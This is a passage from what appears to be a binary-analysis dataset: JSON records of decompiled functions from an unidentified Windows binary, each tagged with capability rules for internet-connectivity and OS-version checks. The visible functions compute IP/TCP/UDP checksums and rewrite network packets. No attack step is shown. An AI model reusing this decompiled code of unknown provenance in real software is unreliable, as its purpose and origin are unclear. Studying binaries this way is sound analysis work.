appiStack64[0] = NULL;\n                aiStackX32[0] = 0;\n            }\n        }\n        if (iStack72 != 0) {\n            fcn.0002edfc(iStack72 + 0x68);\n            (**0x11060)(iStack72);\n        }\n        if (appiStack64[0] != NULL) {\n            (**0x11110)();\n        }\n        if (arg1_00 != NULL) {\n            fcn.0002fc50(arg1_00);\n        }\n    }\n    return aiStackX32[0];\n}\n",
        "token_count": 670
    },
    "0004128c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0004128c(int16_t *arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int16_t *apiStackX8 [4];\n    \n    iVar2 = 0;\n    apiStackX8[0] = arg1;\n    do {\n        uVar1 = fcn.000301cc(apiStackX8[0], apiStackX8, 0x10);\n        if (0xff < uVar1) {\n            return 0;\n        }\n        if (iVar2 < 5) {\n            if ((*apiStackX8[0] != 0x2d) && (*apiStackX8[0] != 0x3a)) {\n                return 0;\n            }\n            apiStackX8[0] = apiStackX8[0] + 1;\n        }\n        else if (*apiStackX8[0] != 0) {\n            return 0;\n        }\n        *(iVar2 + arg2) = uVar1;\n        iVar2 = iVar2 + 1;\n        if (5 < iVar2) {\n            return 1;\n        }\n    } while( true );\n}\n",
        "token_count": 261
    },
    "00042610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00042610(void)\n\n{\n    int32_t iVar1;\n    int32_t aiStackX8 [8];\n    \n    aiStackX8[0] = 0;\n    if (*0x7b770 == 0) {\n        *0x888a0 = 0;\n        *0x7b768 = 0;\n        fcn.0002ed80(0x87c88);\n        *0x87c90 = 0;\n        fcn.0001a650(0x7b770, 0x420ac, 0);\n        *0x7b700 = 0x15af0;\n        *0x7b708 = aiStackX8;\n        *0x7b6f8 = 0x24;\n        iVar1 = fcn.00061b28(1, 0x15ac8, 0x7b6f0, 0, 0);\n        if (iVar1 == 0) {\n            *0x888a8 = aiStackX8[0] != 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "000426c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000426c8(uint64_t arg1, int32_t *arg2, int64_t arg3, uint64_t arg4)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    unkbyte6 Var7;\n    int32_t *arg2_00;\n    int32_t *piVar8;\n    ulong arg1_00;\n    uint64_t arg1_01;\n    uint32_t *puVar9;\n    bool bVar10;\n    int64_t iStackX16;\n    uchar auStack104 [8];\n    int32_t iStack96;\n    ushort uStack92;\n    ushort uStack90;\n    ushort uStack88;\n    ushort uStack86;\n    ushort uStack84;\n    \n    arg1_01 = arg1 & 0xffffffff;\n    Var7 = arg1 >> 0x10;\n    arg2_00 = arg2;\n    iVar4 = fcn.0002fd20();\n    if ((*(arg2 + 3) == iVar4) && (0x1b < (arg4 & 0xffffffff))) {\n        fcn.00042528(arg1_01, arg2, arg3);\n    }\n    else if ((*0x888a8 == '\\0') && (iVar4 = fcn.0002fd20(CONCAT62(Var7, 0x800)),  *(arg2 + 3) == iVar4)) {\n        uVar3 = (**0x113d0)(0x888a0);\n        piVar8 = 0x87cc8;\n        puVar9 = 0x87cb0;\n        iStackX16 = 0x40;\n        do {\n            if (piVar8[-4] == arg1_01) {\n                if ((*(arg3 + 0xc) == piVar8[-10]) && (*(arg3 + 0x10) == piVar8[-7])) {\n                    uVar2 = *(arg2 + 6);\n                    arg2_00 = uVar2;\n                    bVar10 = uVar2 < puVar9[-3];\n                    if (uVar2 == puVar9[-3]) {\n                        uVar1 = *(arg2 + 10);\n                        arg2_00 = uVar2 & 0xffff0000 | uVar1;\n                        bVar10 = uVar1 < *(puVar9 + -2);\n                        if (uVar1 != *(puVar9 + -2)) goto code_r0x0004278f;\n                        iVar5 = 0;\n                    }\n                    else {\ncode_r0x0004278f:\n                        iVar5 = (1 - bVar10) - (bVar10 != 0);\n                    }\n                    if (iVar5 != 0) goto code_r0x000427c3;\n                    *piVar8 = *piVar8 + 1;\n                    iStack96 = piVar8[-6];\n                    uStack92 = *(piVar8 + -5);\n                }\n                else {\ncode_r0x000427c3:\n                    if ((*(arg3 + 0xc) != piVar8[-7]) || (*(arg3 + 0x10) != piVar8[-10])) goto code_r0x000428a6;\n                    uVar2 = *(arg2 + 6);\n                    arg2_00 = uVar2;\n                    bVar10 = uVar2 < *puVar9;\n                    if (uVar2 == *puVar9) {\n                        uVar1 = *(arg2 + 10);\n                        arg2_00 = uVar2 & 0xffff0000 | uVar1;\n                        bVar10 = uVar1 < *(puVar9 + 1);\n                        if (uVar1 != *(puVar9 + 1)) goto code_r0x000427ef;\n                        iVar5 = 0;\n                    }\n                    else {\ncode_r0x000427ef:\n                        iVar5 = (1 - bVar10) - (bVar10 != 0);\n                    }\n                    if (iVar5 != 0) goto code_r0x000428a6;\n                    piVar8[1] = piVar8[1] + 1;\n                    iStack96 = piVar8[-9];\n                    uStack92 = *(piVar8 + -8);\n                }\n                uStack86 = 0;\n                uStack88 = 0;\n                uStack90 = 0;\n                uStack84 = *(arg2 + 3);\n                fcn.00031564(0x7b290, auStack104, 0);\n                iVar6 = fcn.00036bf8(arg1_01, 1);\n                if (iVar6 == 0) {\n                    arg1_00 = 0;\n                }\n                else {\n                    arg1_00 = *(iVar6 + 0x450);\n                    uStack90 = *(iVar6 + 0x14);\n                    uStack88 = *(iVar6 + 0x14) >> 0x10;\n                    uStack86 = *(iVar6 + 0x18);\n                }\n                fcn.00031598(0x7b290, auStack104, 0);\n                arg2_00 = &iStack96;\n                fcn.00041014(arg1_00, arg2_00, arg3, arg4 & 0xffffffff);\n            }\ncode_r0x000428a6:\n            puVar9 = puVar9 + 0xc;\n            piVar8 = piVar8 + 0xc;\n            iStackX16 = iStackX16 + -1;\n        } while (iStackX16 != 0);\n        (**0x113c0)(0x888a0, arg2_00 & 0xffffffffffffff00 | uVar3);\n    }\n    return;\n}\n",
        "token_count": 1280
    },
    "0004296c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0004296c(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint16_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    \n    uVar19 = arg3 - 0x14;\n    puVar18 = arg2 + 10;\n    uVar20 = arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg2[9] + arg1[1] + arg2[8] + arg2[7] + arg2[6] + arg2[5] + arg2[4]\n             + arg2[3] + arg2[2] + arg2[1] + *arg1 + *arg2;\n    if (0x1f < uVar19) {\n        uVar21 = uVar19 >> 5;\n        uVar19 = uVar19 + (uVar19 >> 5) * -0x20;\n        do {\n            puVar1 = puVar18 + 0xe;\n            puVar2 = puVar18 + 0xf;\n            puVar3 = puVar18 + 0xd;\n            puVar4 = puVar18 + 0xc;\n            puVar5 = puVar18 + 0xb;\n            puVar6 = puVar18 + 10;\n            puVar7 = puVar18 + 9;\n            puVar8 = puVar18 + 8;\n            puVar9 = puVar18 + 7;\n            puVar10 = puVar18 + 6;\n            puVar11 = puVar18 + 5;\n            puVar12 = puVar18 + 4;\n            puVar13 = puVar18 + 3;\n            puVar14 = puVar18 + 2;\n            puVar15 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 0x10;\n            uVar20 = uVar20 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (7 < uVar19) {\n        uVar21 = uVar19 >> 3;\n        uVar19 = uVar19 + (uVar19 >> 3) * -8;\n        do {\n            puVar1 = puVar18 + 2;\n            puVar2 = puVar18 + 3;\n            puVar3 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 4;\n            uVar20 = uVar20 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (1 < uVar19) {\n        uVar17 = (uVar19 - 2 >> 1) + 1;\n        uVar21 = uVar17;\n        uVar19 = uVar19 + uVar17 * -2;\n        do {\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 1;\n            uVar20 = uVar20 + uVar16;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (uVar19 == 1) {\n        uVar20 = uVar20 + *puVar18;\n    }\n    uVar19 = (uVar20 >> 0x10) + (uVar20 & 0xffff);\n    return ~((uVar19 >> 0x10) + uVar19);\n}\n",
        "token_count": 1059
    },
    "00042af4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00042af4(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint16_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    \n    uVar19 = arg3 - 8;\n    puVar18 = arg2 + 4;\n    uVar20 = arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg1[1] + arg2[3] + arg2[2] + arg2[1] + *arg1 + *arg2;\n    if (0x1f < uVar19) {\n        uVar21 = uVar19 >> 5;\n        uVar19 = uVar19 + (uVar19 >> 5) * -0x20;\n        do {\n            puVar1 = puVar18 + 0xe;\n            puVar2 = puVar18 + 0xf;\n            puVar3 = puVar18 + 0xd;\n            puVar4 = puVar18 + 0xc;\n            puVar5 = puVar18 + 0xb;\n            puVar6 = puVar18 + 10;\n            puVar7 = puVar18 + 9;\n            puVar8 = puVar18 + 8;\n            puVar9 = puVar18 + 7;\n            puVar10 = puVar18 + 6;\n            puVar11 = puVar18 + 5;\n            puVar12 = puVar18 + 4;\n            puVar13 = puVar18 + 3;\n            puVar14 = puVar18 + 2;\n            puVar15 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 0x10;\n            uVar20 = uVar20 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (7 < uVar19) {\n        uVar21 = uVar19 >> 3;\n        uVar19 = uVar19 + (uVar19 >> 3) * -8;\n        do {\n            puVar1 = puVar18 + 2;\n            puVar2 = puVar18 + 3;\n            puVar3 = puVar18 + 1;\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 4;\n            uVar20 = uVar20 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (1 < uVar19) {\n        uVar17 = (uVar19 - 2 >> 1) + 1;\n        uVar21 = uVar17;\n        uVar19 = uVar19 + uVar17 * -2;\n        do {\n            uVar16 = *puVar18;\n            puVar18 = puVar18 + 1;\n            uVar20 = uVar20 + uVar16;\n            uVar21 = uVar21 - 1;\n        } while (uVar21 != 0);\n    }\n    if (uVar19 == 1) {\n        uVar20 = uVar20 + *puVar18;\n    }\n    uVar19 = (uVar20 >> 0x10) + (uVar20 & 0xffff);\n    return ~((uVar19 >> 0x10) + uVar19);\n}\n",
        "token_count": 1020
    },
    "00042c54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00042c54(uint16_t *arg1, ulong arg2)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    \n    uVar18 = 0;\n    if (0x1f < arg2) {\n        uVar19 = arg2 >> 5;\n        arg2._0_4_ = arg2 + (arg2 >> 5) * -0x20;\n        do {\n            puVar1 = arg1 + 0xe;\n            puVar2 = arg1 + 0xf;\n            puVar3 = arg1 + 0xd;\n            puVar4 = arg1 + 0xc;\n            puVar5 = arg1 + 0xb;\n            puVar6 = arg1 + 10;\n            puVar7 = arg1 + 9;\n            puVar8 = arg1 + 8;\n            puVar9 = arg1 + 7;\n            puVar10 = arg1 + 6;\n            puVar11 = arg1 + 5;\n            puVar12 = arg1 + 4;\n            puVar13 = arg1 + 3;\n            puVar14 = arg1 + 2;\n            puVar15 = arg1 + 1;\n            uVar16 = *arg1;\n            arg1 = arg1 + 0x10;\n            uVar18 = uVar18 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (7 < arg2) {\n        uVar19 = arg2 >> 3;\n        arg2._0_4_ = arg2 + (arg2 >> 3) * -8;\n        do {\n            puVar1 = arg1 + 2;\n            puVar2 = arg1 + 3;\n            puVar3 = arg1 + 1;\n            uVar16 = *arg1;\n            arg1 = arg1 + 4;\n            uVar18 = uVar18 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (1 < arg2) {\n        uVar17 = (arg2 - 2 >> 1) + 1;\n        uVar19 = uVar17;\n        arg2._0_4_ = arg2 + uVar17 * -2;\n        do {\n            uVar16 = *arg1;\n            arg1 = arg1 + 1;\n            uVar18 = uVar18 + uVar16;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (arg2 == 1) {\n        uVar18 = uVar18 + *arg1;\n    }\n    uVar18 = (uVar18 >> 0x10) + (uVar18 & 0xffff);\n    return ~((uVar18 >> 0x10) + uVar18);\n}\n",
        "token_count": 893
    },
    "00042e54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00042e54(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint8_t uVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    ulong in_stack_00000028;\n    uint32_t in_stack_00000030;\n    ulong in_stack_00000038;\n    uint32_t in_stack_00000040;\n    uint in_stack_00000048;\n    uchar in_stack_00000050;\n    uint in_stack_00000058;\n    uint64_t in_stack_00000060;\n    uint32_t in_stack_00000068;\n    \n    uVar6 = arg4;\n    if (*0x7b7a0 == '\\0') {\n        iVar2 = in_stack_00000030 + uVar6;\n        iVar1 = iVar2 + in_stack_00000040;\n        piVar5 = fcn.0002fbf0(in_stack_00000068 + 0x58 + iVar1);\n        if (piVar5 != NULL) {\n            fcn.00061a56(piVar5, 0, 0x58);\n            fcn.000619f6(piVar5 + 0x54, arg3, uVar6);\n            fcn.000619f6(uVar6 + 0x54 + piVar5, in_stack_00000028, in_stack_00000030);\n            iVar2 = iVar2 + 0x54 + piVar5;\n            fcn.000619f6(iVar2, in_stack_00000038, in_stack_00000040);\n            iVar1 = iVar1 + 0x54 + piVar5;\n            fcn.000619f6(iVar1, in_stack_00000060, in_stack_00000068);\n            piVar5[2] = arg2;\n            *(piVar5 + 4) = arg4 + in_stack_00000030;\n            piVar5[1] = arg1;\n            *(piVar5 + 0x34) = in_stack_00000048;\n            piVar5[3] = piVar5 + 0x54;\n            *(piVar5 + 7) = in_stack_00000050;\n            piVar5[5] = iVar2;\n            *(piVar5 + 8) = in_stack_00000058;\n            *(piVar5 + 6) = in_stack_00000040;\n            *(piVar5 + 10) = in_stack_00000068;\n            piVar5[9] = iVar1;\n            uVar4 = (**0x113d0)(0x7b7a8);\n            piVar3 = piVar5;\n            if (*0x7b7f0 != NULL) {\n                **0x7b7f0 = piVar5;\n                *0x7b7f0 = piVar5;\n                piVar5 = *0x7b7f0;\n                piVar3 = *0x7b7f8;\n            }\n            *0x7b7f8 = piVar3;\n            *0x7b7f0 = piVar5;\n            (**0x113c0)(0x7b7a8, in_stack_00000060 & 0xffffffffffffff00 | uVar4);\n            fcn.0002ee20(0x7b790);\n        }\n    }\n    return;\n}\n",
        "token_count": 774
    },
    "00043208": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00043208(void)\n\n{\n    uint64_t uVar1;\n    uint64_t *puVar2;\n    \n    uVar1 = fcn.00061b64();\n    puVar2 = 0x7b828;\n    while ((*puVar2 == 0 || (*puVar2 != (uVar1 & 0xffffffff)))) {\n        puVar2 = puVar2 + 2;\n        if (0x7b877 < puVar2) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 120
    },
    "00043950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00043950(int64_t arg1)\n\n{\n    uint16_t *puVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int16_t iVar5;\n    ushort uVar6;\n    uint16_t uVar7;\n    int32_t iVar8;\n    uchar *arg2;\n    uint64_t arg1_00;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uint8_t *arg1_01;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint16_t *puVar14;\n    uint8_t *puVar15;\n    int64_t iVar16;\n    int64_t iVar17;\n    uint64_t arg3;\n    uint uStackX8;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack64;\n    uchar uStack63;\n    ushort uStack62;\n    \n    arg3 = 0x3c;\n    if ((*(arg1 + 0x38) & 0x10) == 0) {\n        uVar13 = *(arg1 + 0x30) + *(arg1 + 0x20);\n        arg1_00 = uVar13;\n        if (uVar13 < 0x3d) {\n            arg1_00 = 0x3c;\n        }\n        arg2 = fcn.0002fbf0(arg1_00);\n        if (arg2 == NULL) {\n            return;\n        }\n    }\n    else {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + -4;\n        arg2 = fcn.0002fbf0(*(arg1 + 0x20) + 0x400);\n        if (arg2 == NULL) {\n            return;\n        }\n        uVar13 = *(arg1 + 0x20);\n        iVar8 = *(arg1 + 0x50);\n        *(arg2 + uVar13 + 0x200) = *(arg1 + 0x40);\n        fcn.000619f6(arg2 + uVar13 + 0x204, *(arg1 + 0x48), *(arg1 + 0x50));\n        iVar8 = fcn.00055c68(arg2 + uVar13 + 0x200, iVar8 + 4, *(arg1 + 0x28), *(arg1 + 0x30));\n        if (iVar8 == 0) goto code_r0x00043dc4;\n        *(arg1 + 0x30) = uStackX8;\n    }\n    fcn.000619f6(arg2, *(arg1 + 0x18), *(arg1 + 0x20));\n    if ((*(arg1 + 0x38) & 0x10) == 0) {\n        fcn.000619f6(arg2 + *(arg1 + 0x20), *(arg1 + 0x28), *(arg1 + 0x30));\n    }\n    if (*(arg1 + 0x20) < 0xe) goto code_r0x00043dc4;\n    uVar13 = *(arg1 + 0x20) - 0xe;\n    puVar1 = arg2 + 0xe;\n    iVar16 = 6;\n    puVar10 = arg2;\n    do {\n        uVar2 = puVar10[6];\n        puVar10[6] = *puVar10;\n        *puVar10 = uVar2;\n        puVar10 = puVar10 + 1;\n        iVar16 = iVar16 + -1;\n    } while (iVar16 != 0);\n    iVar5 = fcn.0002fd20();\n    if (iVar5 == 0x800) {\n        if (uVar13 < 0x14) goto code_r0x00043dc4;\n        uVar12 = (*puVar1 & 0xf) * 4;\n        if ((uVar12 < 0x14) || (uVar13 < uVar12)) goto code_r0x00043dc4;\n        uVar13 = uVar13 + (*puVar1 & 0xf) * -4;\n        arg1_01 = puVar1 + uVar12;\n        puVar10 = arg2 + 0x1a;\n        iVar17 = 4;\n        iVar16 = 0x1e - puVar10;\n        do {\n            uVar2 = puVar10[arg2 + iVar16];\n            puVar10[arg2 + iVar16] = *puVar10;\n            *puVar10 = uVar2;\n            puVar10 = puVar10 + 1;\n            iVar17 = iVar17 + -1;\n        } while (iVar17 != 0);\n        *(arg2 + 0x14) = 0;\n        arg2[0x16] = 0x80;\n        *0x7b7e8 = *0x7b7e8 + 1;\n        uVar6 = fcn.0002fd20();\n        *(arg2 + 0x12) = uVar6;\n        uVar7 = fcn.0002fd20();\n        *(arg2 + 0x18) = 0;\n        puVar14 = arg2 + 0x22;\n        *(arg2 + 0x10) = uVar7;\n        uVar9 = *(arg2 + 0x20) + *(arg2 + 0x1c) + *(arg2 + 0x1a) + *(arg2 + 0x16) + *(arg2 + 0x1e) + *(arg2 + 0x12) +\n                *(arg2 + 0x14) + *puVar1 + uVar7;\n        for (iVar8 = uVar12 - 0x14; iVar8 != 0; iVar8 = iVar8 + -4) {\n            uVar7 = *puVar14;\n            puVar1 = puVar14 + 1;\n            puVar14 = puVar14 + 2;\n            uVar9 = uVar9 + uVar7 + *puVar1;\n        }\n        iVar8 = (uVar9 >> 0x10) + (uVar9 & 0xffff);\n        cVar4 = arg2[0x17];\n        *(arg2 + 0x18) = ~((iVar8 >> 0x10) + iVar8);\n        if (cVar4 == '\\x01') {\n            if (uVar13 < 4) goto code_r0x00043dc4;\n            if (*arg1_01 == 8) {\n                *arg1_01 = 0;\n            }\n            else if (*arg1_01 == 0xd) {\n                *arg1_01 = 0xe;\n            }\n            else if (*arg1_01 == 0xf) {\n                *arg1_01 = 0x10;\n            }\n            else if (*arg1_01 == 0x11) {\n                *arg1_01 = 0x12;\n            }\n            else {\n                *arg1_01 = 3;\n                arg1_01[1] = 1;\n            }\n            puVar11 = arg1_01 + 4;\n            if ((*(arg1 + 0x38) & 1) != 0) {\n                if ((*(arg1 + 0x38) & 8) != 0) {\n                    *puVar11 = *(arg1 + 0x40);\n                    puVar11 = arg1_01 + 8;\n                }\n                uVar12 = fcn.0002fcf4(*puVar11);\n                uVar12 = uVar12 & 0xbfffffff;\n                if ((*(arg1 + 0x38) & 2) != 0) {\n                    uVar12 = uVar12 | 0x40000000;\n                }\n                uVar12 = fcn.0002fcf4(uVar12);\n                *puVar11 = uVar12;\n            }\n            *(arg1_01 + 2) = 0;\n            uVar6 = fcn.00042c54(arg1_01, uVar13 + *(arg1 + 0x30));\n            *(arg1_01 + 2) = uVar6;\n        }\n        else if (cVar4 == '\\x06') {\n            if (uVar13 < 0x14) goto code_r0x00043dc4;\n            iVar16 = 2;\n            puVar15 = arg1_01;\n            do {\n                uVar3 = puVar15[2];\n                puVar15[2] = *puVar15;\n                *puVar15 = uVar3;\n                puVar15 = puVar15 + 1;\n                iVar16 = iVar16 + -1;\n            } while (iVar16 != 0);\n            uStack72 = *(arg2 + 0x1a);\n            uStack64 = 0;\n            uStack68 = *(arg2 + 0x1e);\n            uStack63 = arg2[0x17];\n            uStack62 = fcn.0002fd20(*(arg1 + 0x30) + uVar13);\n            *(arg1_01 + 0x10) = 0;\n            uVar6 = fcn.0004296c(&uStack72, arg1_01, uVar13 + *(arg1 + 0x30));\n            *(arg1_01 + 0x10) = uVar6;\n        }\n        else if (cVar4 == '\\x11') {\n            if (uVar13 < 8) goto code_r0x00043dc4;\n            iVar16 = 2;\n            puVar15 = arg1_01;\n            do {\n                uVar3 = puVar15[2];\n                puVar15[2] = *puVar15;\n                *puVar15 = uVar3;\n                puVar15 = puVar15 + 1;\n                iVar16 = iVar16 + -1;\n            } while (iVar16 != 0);\n            uStack62 = fcn.0002fd20();\n            uStack64 = 0;\n            *(arg1_01 + 4) = uStack62;\n            uStack72 = *(arg2 + 0x1a);\n            uStack68 = *(arg2 + 0x1e);\n            uStack63 = arg2[0x17];\n            *(arg1_01 + 6) = 0;\n            uVar7 = fcn.0002fd20(uStack62);\n            uVar6 = fcn.00042af4(&uStack72, arg1_01, uVar7);\n            *(arg1_01 + 6) = uVar6;\n        }\n    }\n    if (*(arg1 + 0x30) + *(arg1 + 0x20) < 0x3c) {\n        fcn.00061a56(arg2 + *(arg1 + 0x20) + *(arg1 + 0x30));\n    }\n    if (*(arg1 + 8) == 0) {\n        if (*(arg1 + 0x10) != 0) {\n            uVar12 = *(arg1 + 0x30) + *(arg1 + 0x20);\n            uVar13 = 0x3c;\n            if (0x3c < uVar12) {\n                uVar13 = uVar12;\n            }\n            fcn.0003562c(*(arg1 + 0x10), arg2, uVar13);\n        }\n    }\n    else {\n        uVar13 = *(arg1 + 0x30) + *(arg1 + 0x20);\n        if (0x3c < uVar13) {\n            arg3 = uVar13;\n        }\n        fcn.00045b84(*(arg1 + 8), arg2, arg3);\n    }\ncode_r0x00043dc4:\n    fcn.0002fc50(arg2);\n    return;\n}\n",
        "token_count": 2652
    },
    "00044548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00044548(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    \n    if (*0x66234 != -1) {\n        return 1;\n    }\n    uVar1 = 0;\n    pcVar2 = arg1 + 1;\n    while ((((pcVar2[-1] < 3 || (6 < pcVar2[-1])) || ((*pcVar2 != '\\0' && (*pcVar2 != '\\x01')))) || (*(pcVar2 + 3) != 0)\n           )) {\n        uVar1 = uVar1 + 1;\n        pcVar2 = pcVar2 + 1;\n        if (0x7f < uVar1) {\n            return 0;\n        }\n    }\n    if (uVar1 == 0xffffffff) {\n        *0x66234 = uVar1;\n        return 0;\n    }\n    *0x66234 = uVar1;\n    return 1;\n}\n",
        "token_count": 220
    },
    "00044598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00044598(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(arg1 + 0x58);\n    arg2 = arg2 + 0x20;\n    if ((*(arg1 + 0x48) == 0) || (arg2 == 0)) {\ncode_r0x000445ca:\n        if ((iVar1 != 0) && (arg2 != 0)) {\n            iVar2 = fcn.00061bd0(iVar1, arg2, 1);\n            if (iVar2 == 0) goto code_r0x000445c6;\n        }\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = fcn.00061bd0(*(arg1 + 0x48), arg2, 1);\n        if (iVar2 != 0) goto code_r0x000445ca;\ncode_r0x000445c6:\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
